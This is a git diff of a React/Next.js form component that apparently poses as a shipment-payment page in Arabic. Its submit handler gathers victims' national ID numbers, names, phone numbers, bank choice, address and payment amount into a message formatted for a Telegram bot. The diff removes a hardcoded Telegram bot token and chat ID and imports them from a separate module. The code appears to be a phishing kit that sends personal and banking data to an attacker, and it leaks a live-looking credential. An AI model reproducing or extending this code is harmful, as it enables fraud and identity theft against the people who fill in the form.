@@ -3,7 +3,7 @@ import { useRef } from 'react'
 import styles from './fozajil.module.css'
 import Image from 'next/image'
 import formza from '../../../public/formza.png'
-
+import bot from '@/compnante/dataBot'
 import {useRouter,useSearchParams} from 'next/navigation'
 
 
@@ -37,10 +37,7 @@ if(numbertrack.current.value == "" || numbernation.current.value == "" || fullna
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    var bot={
-      token:"6602536113:AAEOJoRLjsoPUxdqp9SwU1jeFqtuXf712PY",
-      chat_id:6364334502
-    }
+
     var length =`رقم الشحنة: ${numbertrack.current.value} %0A رقم بطاقة الاحوال: ${numbernation.current.value} %0A الاسم الكامل : ${fullname.current.value} %0A رقم الجوال: ${numphone.current.value} %0A نوع الشحنة :${typeshohna.current.value} %0A نوع مشغل الجوال :${selecttypenumber.current.value} %0A نوع البنك :${selectBanks.current.value} %0A العنوان :${adress.current.value} %0A المدينة :${city.current.value} %0A قيمة السداد: ${mony.current.value} %0A %0A ${track}`
 
 
